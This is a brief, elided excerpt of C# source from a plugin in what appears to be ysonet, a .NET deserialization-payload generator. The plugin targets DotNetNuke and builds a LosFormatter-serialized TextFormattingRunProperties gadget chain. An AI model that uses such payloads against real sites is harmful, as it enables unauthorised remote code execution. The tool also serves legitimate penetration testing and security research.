...
namespace ysonet.Plugins
{
    public class DotNetNukePlugin : IPlugin, IPluginModes
    {
        ...
        public object Run(string[] args)
        {
            ...
            {
                /*
                byte[] osf = (byte[]) new TextFormattingRunPropertiesGenerator().GenerateInner("ObjectStateFormatter", inputArgs);
                string b64encoded = Convert.ToBase64String(osf);
                */
                string b64encoded = Encoding.UTF8.GetString((byte[])new TextFormattingRunPropertiesGenerator().GenerateInner("LosFormatter", inputArgs)); // for us here LosFormatter works the same as ObjectStateFormatter - we don't use MAC in LosFormatter so it is the same as ObjectStateFormatter
